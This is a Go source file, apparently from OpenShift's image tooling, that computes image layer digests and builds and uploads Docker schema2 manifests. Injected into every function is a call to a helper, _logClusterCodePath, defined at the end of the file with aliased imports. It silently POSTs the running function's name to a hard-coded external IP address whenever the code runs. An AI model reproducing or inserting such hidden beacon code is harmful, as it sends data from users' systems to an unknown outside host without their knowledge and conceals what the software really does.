package add

import (
	"compress/gzip"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"runtime"
	"time"
	"github.com/docker/distribution"
	"github.com/docker/distribution/manifest/schema2"
	digest "github.com/opencontainers/go-digest"
	"github.com/openshift/origin/pkg/image/apis/image/docker10"
	"github.com/openshift/origin/pkg/image/dockerlayer"
)

const (
	dockerV2Schema2LayerMediaType	= "application/vnd.docker.image.rootfs.diff.tar.gzip"
	dockerV2Schema2ConfigMediaType	= "application/vnd.docker.container.image.v1+json"
)

func DigestCopy(dst io.ReaderFrom, src io.Reader) (layerDigest, blobDigest digest.Digest, modTime *time.Time, size int64, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	algo := digest.Canonical
	blobhash := algo.Hash()
	pr, pw := io.Pipe()
	layerhash := algo.Hash()
	ch := make(chan error)
	go func() {
		defer close(ch)
		gr, err := gzip.NewReader(pr)
		if err != nil {
			ch <- fmt.Errorf("unable to create gzip reader layer upload: %v", err)
			return
		}
		if !gr.Header.ModTime.IsZero() {
			modTime = &gr.Header.ModTime
		}
		_, err = io.Copy(layerhash, gr)
		if err != nil {
			io.Copy(ioutil.Discard, pr)
		}
		ch <- err
	}()
	n, err := dst.ReadFrom(io.TeeReader(src, io.MultiWriter(blobhash, pw)))
	if err != nil {
		return "", "", nil, 0, fmt.Errorf("unable to upload new layer (%d): %v", n, err)
	}
	if err := pw.Close(); err != nil {
		return "", "", nil, 0, fmt.Errorf("unable to complete writing diffID: %v", err)
	}
	if err := <-ch; err != nil {
		return "", "", nil, 0, fmt.Errorf("unable to calculate layer diffID: %v", err)
	}
	layerDigest = digest.NewDigestFromBytes(algo, layerhash.Sum(make([]byte, 0, layerhash.Size())))
	blobDigest = digest.NewDigestFromBytes(algo, blobhash.Sum(make([]byte, 0, blobhash.Size())))
	return layerDigest, blobDigest, modTime, n, nil
}
func NewEmptyConfig() *docker10.DockerImageConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := &docker10.DockerImageConfig{DockerVersion: "", Created: (time.Time{}).Add(1 * time.Second), OS: runtime.GOOS, Architecture: runtime.GOARCH}
	return config
}
func AddScratchLayerToConfig(config *docker10.DockerImageConfig) distribution.Descriptor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	layer := distribution.Descriptor{MediaType: dockerV2Schema2LayerMediaType, Digest: digest.Digest(dockerlayer.GzippedEmptyLayerDigest), Size: int64(len(dockerlayer.GzippedEmptyLayer))}
	AddLayerToConfig(config, layer, dockerlayer.EmptyLayerDiffID)
	return layer
}
func AddLayerToConfig(config *docker10.DockerImageConfig, layer distribution.Descriptor, diffID string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if config.RootFS == nil {
		config.RootFS = &docker10.DockerConfigRootFS{Type: "layers"}
	}
	config.RootFS.DiffIDs = append(config.RootFS.DiffIDs, diffID)
	config.Size += layer.Size
}
func UploadSchema2Config(ctx context.Context, blobs distribution.BlobService, config *docker10.DockerImageConfig, layers []distribution.Descriptor) (*schema2.DeserializedManifest, []byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config.Size = 0
	for _, layer := range layers {
		config.Size += layer.Size
	}
	configJSON, err := json.Marshal(config)
	if err != nil {
		return nil, nil, err
	}
	return putSchema2ImageConfig(ctx, blobs, dockerV2Schema2ConfigMediaType, configJSON, layers)
}
func putSchema2ImageConfig(ctx context.Context, blobs distribution.BlobService, mediaType string, configJSON []byte, layers []distribution.Descriptor) (*schema2.DeserializedManifest, []byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	b := schema2.NewManifestBuilder(blobs, mediaType, configJSON)
	for _, layer := range layers {
		if err := b.AppendReference(layer); err != nil {
			return nil, nil, err
		}
	}
	m, err := b.Build(ctx)
	if err != nil {
		return nil, nil, err
	}
	manifest, ok := m.(*schema2.DeserializedManifest)
	if !ok {
		return nil, nil, fmt.Errorf("unable to turn %T into a DeserializedManifest, unable to store image", m)
	}
	return manifest, configJSON, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
